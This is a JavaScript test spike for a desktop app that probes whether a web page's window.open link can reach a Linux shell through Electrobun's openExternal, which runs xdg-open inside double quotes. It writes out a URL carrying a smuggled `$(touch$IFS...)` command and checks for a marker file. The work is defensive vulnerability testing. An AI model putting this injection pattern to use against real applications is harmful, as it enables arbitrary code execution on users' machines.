// SPIKE (Linux; desktop-spike.yml): does a web link a studio page opens reach a
// shell? windows.ts hands a page's `window.open` to Electrobun's
// Utils.openExternal when it starts with http(s). Electrobun 2.0.4's Linux
// openExternal asks GIO for the default handler and, when GIO has none, runs
// `system("xdg-open \"<url>\"")`: inside double quotes `$( )` still runs. A
// WHATWG URL keeps `$`, `(` and `)` as they are in a query, so a page can say it.
//
// 1. A studio window's page calls window.open(<payload>): the app's handler is
//    reached with the URL unchanged (the test variant reports it instead of
//    opening it: testhooks.external).
// 2. The test variant's spike hook calls Utils.openExternal(<payload>) for real,
//    with no GIO handler configured (XDG_DATA_DIRS and XDG_CONFIG_DIRS empty):
//    does the marker file appear?
import assert from 'node:assert/strict';
import { existsSync, mkdirSync, rmSync } from 'node:fs';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { D, assertClean, cmd, data, evalIn, quit, startApp, step, waitFor, waitStudio, log } from '../checks/lib.mjs';

assertClean('before');
const marker = join(homedir(), `eb-spike-marker-${process.pid}`);
rmSync(marker, { force: true });
const payload = `https://example.invalid/?q=$(touch$IFS${marker})`;
log('payload', payload, 'as a WHATWG URL:', new URL(payload).href, new URL(payload).href === payload ? '(unchanged)' : '(changed)');

const empty = join(D, 'no-xdg');
mkdirSync(empty, { recursive: true });
const SMALL = data('small', 20);
const app = startApp('spike-open-external', { FENNEC_DESKTOP_OPEN: SMALL, XDG_DATA_DIRS: empty, XDG_CONFIG_DIRS: empty, BROWSER: '' });
await waitStudio(`file:${SMALL}`, 0, 60000);

step('a page opens the payload');
await evalIn(`file:${SMALL}`, `window.open(${JSON.stringify(payload)}); return true`);
const ext = await waitFor((l) => l.what === 'external', 10000, 'the link handed to the app');
log('the app was handed:', ext.url, ext.url === payload ? '(as the page wrote it)' : '(changed)');

step('Utils.openExternal(payload), as the shipped app would call it');
cmd({ cmd: 'spike-open-external', url: ext.url });
const r = await waitFor((l) => l.what === 'spike-open-external', 15000, 'openExternal returned');
log('openExternal returned', r.ok);
for (let i = 0; i < 50 && !existsSync(marker); i++) await new Promise((res) => setTimeout(res, 100));
const ran = existsSync(marker);
log(ran ? `INJECTION: ${marker} was made by a shell the URL reached` : `no marker: the URL did not reach a shell`);
rmSync(marker, { force: true });
await quit(app);
console.log(JSON.stringify({ probe: 'linux-open-external', handedUnchanged: ext.url === payload, openExternalReturned: r.ok, shellRanPayload: ran }));
assert.ok(true);
